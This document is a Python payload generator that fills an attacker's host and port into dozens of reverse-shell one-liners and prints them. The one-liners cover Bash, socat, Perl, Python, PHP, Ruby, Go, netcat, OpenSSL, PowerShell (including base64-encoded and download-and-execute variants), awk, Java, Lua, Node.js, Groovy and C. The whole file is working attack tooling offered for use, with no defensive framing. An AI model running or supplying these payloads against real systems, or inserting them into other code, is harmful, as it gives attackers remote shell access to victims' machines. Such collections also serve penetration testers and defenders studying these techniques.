import base64

def push_payload(lhost,lport,payload):
    
    if "{lport2}" in payload:

        lport2 = int(lport)+1
        lport2 = str(lport2)

        payload = payload.replace("{lhost}",lhost)
        payload = payload.replace("{lport}",lport)
        payload = payload.replace("{lport2}",lport2)
        print(payload)

    else:
        payload = payload.replace("{lhost}",lhost)
        payload = payload.replace("{lport}",lport)

        print(payload)


def push_payload_base64(init,lhost,lport,payload):
    
    lhost = mix_down(lhost)
    lport = mix_down(lport)

    payload = payload.replace("{lhost}",lhost)
    payload = payload.replace("{lport}",lport)

    payload = base64.b64encode(payload.encode())
    payload = init + payload.decode()

    print(payload)

def mix_down(self):

    text = ""
    for i in self:
        text += i + "."
    return text



def Bash(lhost,lport):

    payload = """
    
    #TCP

    bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'
    
    bash -c "bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"

    bash -i >& /dev/tcp/{lhost}/{lport} 0>&1
    
    0<&196;exec 196<>/dev/tcp/{lhost}/{lport}; sh <&196 >&196 2>&196
    
    /bin/bash -l > /dev/tcp/{lhost}/{lport} 0<&1 2>&1
    

    #UDP

    #Victim:
    sh -i >& /dev/udp/{lhost}/{lport} 0>&1
    
    #Listener:
    nc -u -lvp {lport}
    """
    push_payload(lhost,lport,payload)


def Socat(lhost,lport):

    payload = """
    #Attacker:
    socat file:`tty`,raw,echo=0 TCP-L:{lport}
    
    #Victim:
    /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:{lhost}:{lport}
    
    wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:{lhost}:{lport}
    """
    push_payload(lhost,lport,payload)

def Perl(lhost,lport):

    payload = """
    
    perl -e 'use Socket;$i="{lhost}";$p={lport};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
    
    perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"{lhost}:{lport}");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
    
    NOTE: Windows only
    perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"{lhost}:{lport}");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
    """
    push_payload(lhost,lport,payload)
    
def Python(lhost,lport):

    payload = """
    
    #Linux Only

    export RHOST="{lhost}";export RPORT={lport};python -c 'import socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
    
    python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{lhost}",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
    
    python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{lhost}",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
    
    python -c 'import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{lhost}",{lport}));subprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'
    
    #Linux_Only_No_Space

    python -c 'socket=__import__("socket");os=__import__("os");pty=__import__("pty");s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{lhost}",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
    
    python -c 'socket=__import__("socket");subprocess=__import__("subprocess");os=__import__("os");s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{lhost}",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
    
    python -c 'socket=__import__("socket");subprocess=__import__("subprocess");s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{lhost}",{lport}));subprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'
    
    python -c 'a=__import__;s=a("socket");o=a("os").dup2;p=a("pty").spawn;c=s.socket(s.AF_INET,s.SOCK_STREAM);c.connect(("{lhost}",{lport}));f=c.fileno;o(f(),0);o(f(),1);o(f(),2);p("/bin/sh")'
    
    python -c 'a=__import__;b=a("socket");p=a("subprocess").call;o=a("os").dup2;s=b.socket(b.AF_INET,b.SOCK_STREAM);s.connect(("{lhost}",{lport}));f=s.fileno;o(f(),0);o(f(),1);o(f(),2);p(["/bin/sh","-i"])'
    
    python -c 'a=__import__;b=a("socket");c=a("subprocess").call;s=b.socket(b.AF_INET,b.SOCK_STREAM);s.connect(("{lhost}",{lport}));f=s.fileno;c(["/bin/sh","-i"],stdin=f(),stdout=f(),stderr=f())'
    
    python -c 'a=__import__;s=a("socket").socket;o=a("os").dup2;p=a("pty").spawn;c=s();c.connect(("{lhost}",{lport}));f=c.fileno;o(f(),0);o(f(),1);o(f(),2);p("/bin/sh")'
    
    python -c 'a=__import__;b=a("socket").socket;p=a("subprocess").call;o=a("os").dup2;s=b();s.connect(("{lhost}",{lport}));f=s.fileno;o(f(),0);o(f(),1);o(f(),2);p(["/bin/sh","-i"])'
    
    python -c 'a=__import__;b=a("socket").socket;c=a("subprocess").call;s=b();s.connect(("{lhost}",{lport}));f=s.fileno;c(["/bin/sh","-i"],stdin=f(),stdout=f(),stderr=f())'
    
    #Windows Only
    
    C:\Python27\python.exe -c "(lambda __y, __g, __contextlib: [[[[[[[(s.connect(('{lhost}', {lport})), [[[(s2p_thread.start(), [[(p2s_thread.start(), (lambda __out: (lambda __ctx: [__ctx.__enter__(), __ctx.__exit__(None, None, None), __out[0](lambda: None)][2])(__contextlib.nested(type('except', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: __exctype is not None and (issubclass(__exctype, KeyboardInterrupt) and [True for __out[0] in [((s.close(), lambda after: after())[1])]][0])})(), type('try', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: [False for __out[0] in [((p.wait(), (lambda __after: __after()))[1])]][0]})())))([None]))[1] for p2s_thread.daemon in [(True)]][0] for __g['p2s_thread'] in [(threading.Thread(target=p2s, args=[s, p]))]][0])[1] for s2p_thread.daemon in [(True)]][0] for __g['s2p_thread'] in [(threading.Thread(target=s2p, args=[s, p]))]][0] for __g['p'] in [(subprocess.Popen(['\\\windows\\\system32\\\cmd.exe'], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE))]][0])[1] for __g['s'] in [(socket.socket(socket.AF_INET, socket.SOCK_STREAM))]][0] for __g['p2s'], p2s.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: (__l['s'].send(__l['p'].stdout.read(1)), __this())[1] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 'p2s')]][0] for __g['s2p'], s2p.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: [(lambda __after: (__l['p'].stdin.write(__l['data']), __after())[1] if (len(__l['data']) > 0) else __after())(lambda: __this()) for __l['data'] in [(__l['s'].recv(1024))]][0] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 's2p')]][0] for __g['os'] in [(__import__('os', __g, __g))]][0] for __g['socket'] in [(__import__('socket', __g, __g))]][0] for __g['subprocess'] in [(__import__('subprocess', __g, __g))]][0] for __g['threading'] in [(__import__('threading', __g, __g))]][0])((lambda f: (lambda x: x(x))(lambda y: f(lambda: y(y)()))), globals(), __import__('contextlib'))"
    """
    push_payload(lhost,lport,payload)

def php(lhost,lport):

    payload = """
    php -r '$sock=fsockopen("{lhost}",{lport});exec("/bin/sh -i <&3 >&3 2>&3");'
    
    php -r '$sock=fsockopen("{lhost}",{lport});shell_exec("/bin/sh -i <&3 >&3 2>&3");'
    
    php -r '$sock=fsockopen("{lhost}",{lport});`/bin/sh -i <&3 >&3 2>&3`;'
    
    php -r '$sock=fsockopen("{lhost}",{lport});system("/bin/sh -i <&3 >&3 2>&3");'
    
    php -r '$sock=fsockopen("{lhost}",{lport});passthru("/bin/sh -i <&3 >&3 2>&3");'
    
    php -r '$sock=fsockopen("{lhost}",{lport});popen("/bin/sh -i <&3 >&3 2>&3", "r");'
    
    php -r '$sock=fsockopen("{lhost}",{lport});$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'
    """
    push_payload(lhost,lport,payload)


def ruby(lhost,lport):
    payload = """
    ruby -rsocket -e'f=TCPSocket.open("{lhost}",{lport}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'

    ruby -rsocket -e'exit if fork;c=TCPSocket.new("{lhost}","{lport}");loop{c.gets.chomp!;(exit! if $_=="exit");($_=~/cd (.+)/i?(Dir.chdir($1)):(IO.popen($_,?r){|io|c.print io.read}))rescue c.puts "failed: #{$_}"}'

    #NOTE: Windows only
    ruby -rsocket -e 'c=TCPSocket.new("{lhost}","{lport}");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'

    """

    push_payload(lhost,lport,payload)

def golang(lhost,lport):

    payload = """
    echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","{lhost}:{lport}");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go

    """
    push_payload(lhost,lport,payload)

def Netcat(lhost,lport):

    payload = """
    #Traditional:
    nc -e /bin/sh {lhost} {lport}
    
    nc -e /bin/bash {lhost} {lport}
    
    nc -c bash {lhost} {lport}

    #OpenBsd:
    rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f

    #BusyBox:
    rm /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f

    """
    push_payload(lhost,lport,payload)

def Ncat(lhost,lport):

    payload = """
    ncat {lhost} {lport} -e /bin/bash

    ncat --udp {lhost} {lport} -e /bin/bash
    """
    push_payload(lhost,lport,payload)


def OpenSSL(lhost,lport):

    payload = """
    Attacker >  openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
    
    Attacker >  openssl s_server -quiet -key key.pem -cert cert.pem -port {lport}
    
    or
    
    Attacker >  ncat --ssl -vv -l -p {lport}

    victim:  >  mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect {lhost}:{lport} > /tmp/s; rm /tmp/s

    #TLS-PSK (does not rely on PKI or self-signed certificates):

    # generate 384-bit PSK
    # use the generated string as a value for the two PSK variables from below
    
    openssl rand -hex 48 

    # server (attacker)
    export LHOST="*"; export LPORT="{lport}"; export PSK="replacewithgeneratedpskfromabove"; openssl s_server -quiet -tls1_2 -cipher PSK-CHACHA20-POLY1305:PSK-AES256-GCM-SHA384:PSK-AES256-CBC-SHA384:PSK-AES128-GCM-SHA256:PSK-AES128-CBC-SHA256 -psk $PSK -nocert -accept $LHOST:$LPORT

    # client (victim)
    export RHOST="{lhost}"; export RPORT="{lport}"; export PSK="replacewithgeneratedpskfromabove"; export PIPE="/tmp/`openssl rand -hex 4`"; mkfifo $PIPE; /bin/sh -i < $PIPE 2>&1 | openssl s_client -quiet -tls1_2 -psk $PSK -connect $RHOST:$RPORT > $PIPE; rm $PIPE

    """
    push_payload(lhost,lport,payload)

def Powershell(lhost,lport):

    payload = """
    powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("{lhost}",{lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()

    powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"

    powershell IEX (New-Object Net.WebClient).DownloadString('https://gist.githubusercontent.com/staaldraad/204928a6004e89553a8d3db0ce527fd5/raw/fe5f74ecfae7ec0f2d50895ecf9ab9dafe253ad4/mini-reverse.ps1')

    """
    push_payload(lhost,lport,payload)

def Powershell_base64(lhost,lport):

    init = "powershell -e "

    payload = """$.c.l.i.e.n.t. .=. .N.e.w.-.O.b.j.e.c.t. .S.y.s.t.e.m...N.e.t...S.o.c.k.e.t.s...T.C.P.C.l.i.e.n.t.(.".{lhost}".,.{lport}).;.$.s.t.r.e.a.m. .=. .$.c.l.i.e.n.t...G.e.t.S.t.r.e.a.m.(.).;.[.b.y.t.e.[.].].$.b.y.t.e.s. .=. .0.....6.5.5.3.5.|.%.{.0.}.;.w.h.i.l.e.(.(.$.i. .=. .$.s.t.r.e.a.m...R.e.a.d.(.$.b.y.t.e.s.,. .0.,. .$.b.y.t.e.s...L.e.n.g.t.h.).). .-.n.e. .0.).{.;.$.d.a.t.a. .=. .(.N.e.w.-.O.b.j.e.c.t. .-.T.y.p.e.N.a.m.e. .S.y.s.t.e.m...T.e.x.t...A.S.C.I.I.E.n.c.o.d.i.n.g.)...G.e.t.S.t.r.i.n.g.(.$.b.y.t.e.s.,.0.,. .$.i.).;.$.s.e.n.d.b.a.c.k. .=. .(.i.e.x. .$.d.a.t.a. .2.>.&.1. .|. .O.u.t.-.S.t.r.i.n.g. .).;.$.s.e.n.d.b.a.c.k.2. .=. .$.s.e.n.d.b.a.c.k. .+. .".P.S. .". .+. .(.p.w.d.)...P.a.t.h. .+. .".>. .".;.$.s.e.n.d.b.y.t.e. .=. .(.[.t.e.x.t...e.n.c.o.d.i.n.g.].:.:.A.S.C.I.I.)...G.e.t.B.y.t.e.s.(.$.s.e.n.d.b.a.c.k.2.).;.$.s.t.r.e.a.m...W.r.i.t.e.(.$.s.e.n.d.b.y.t.e.,.0.,.$.s.e.n.d.b.y.t.e...L.e.n.g.t.h.).;.$.s.t.r.e.a.m...F.l.u.s.h.(.).}.;.$.c.l.i.e.n.t...C.l.o.s.e.(.)."""
    push_payload_base64(init,lhost,lport,payload)

def Awk(lhost,lport):

    payload = """
    awk 'BEGIN {s = "/inet/tcp/0/{lhost}/{lport}"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
    """

    push_payload(lhost,lport,payload)

def Java(lhost,lport):

    payload = """
    Runtime r = Runtime.getRuntime();
    Process p = r.exec("/bin/bash -c 'exec 5<>/dev/tcp/{lhost}/{lport};cat <&5 | while read line; do $line 2>&5 >&5; done'");
    p.waitFor();

    #Java Alternative

    String host="{lhost}";
    int port={lport};
    String cmd="cmd.exe";
    Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();

    #Java Alternative2

    Thread thread = new Thread(){
        public void run(){
            // Reverse shell here
        }
    }
    thread.start();
    
    """
    push_payload(lhost,lport,payload)

def Telnet(lhost,lport):
    payload = """

    #In Attacker machine start two listeners:
    
    nc -lvp {lport}
    nc -lvp {lport2}

    #In Victime machine run below command:
    
    telnet {lhost} {lport} | /bin/sh | telnet {lhost} {lport2}
    """
    push_payload(lhost,lport,payload)


def Lua(lhost,lport):
    payload = """
    #linux only
    lua -e "require('socket');require('os');t=socket.tcp();t:connect('{lhost}','{lport}');os.execute('/bin/sh -i <&3 >&3 2>&3');"

    #windows and linux
    lua5.1 -e 'local host, port = "{lhost}", {lport} local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, "r") local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()'

    """
    push_payload(lhost,lport,payload)

def NodeJS(lhost,lport):
    payload = """
    
    (function(){
        var net = require("net"),
            cp = require("child_process"),
            sh = cp.spawn("/bin/sh", []);
        var client = new net.Socket();
        client.connect({lport}, "{lhost}", function(){
            client.pipe(sh.stdin);
            sh.stdout.pipe(client);
            sh.stderr.pipe(client);
        });
         return /a/; // Prevents the Node.js application form crashing
    })();


    or

    require('child_process').exec('nc -e /bin/sh {lhost} {lport}')

    or

    -var x = global.process.mainModule.require
    -x('child_process').exec('nc {lhost} {lport} -e /bin/bash')


    or -> https://gitlab.com/0x4ndr3/blog/blob/master/JSgen/JSgen.py
    """
    push_payload(lhost,lport,payload)

def Groovy(lhost,lport):

    payload = """
    String host="{lhost}";
    int port={lport};
    String cmd="cmd.exe";
    Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
    
    #GroovyAltenative
    
    Thread.start {
    // Reverse shell here
    }   
    
    """
    push_payload(lhost,lport,payload)

def C_language(lhost,lport):

    payload = """
#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>

int main(void){
    int port = {lport};
    struct sockaddr_in revsockaddr;

    int sockt = socket(AF_INET, SOCK_STREAM, 0);
    revsockaddr.sin_family = AF_INET;       
    revsockaddr.sin_port = htons(port);
    revsockaddr.sin_addr.s_addr = inet_addr("{lhost}");

    connect(sockt, (struct sockaddr *) &revsockaddr, 
    sizeof(revsockaddr));
    dup2(sockt, 0);
    dup2(sockt, 1);
    dup2(sockt, 2);

    char * const argv[] = {"/bin/sh", NULL};
    execve("/bin/sh", argv, NULL);

    return 0;       
    }

    #compile: gcc shell.c --output csh && csh
    """
    push_payload(lhost,lport,payload)
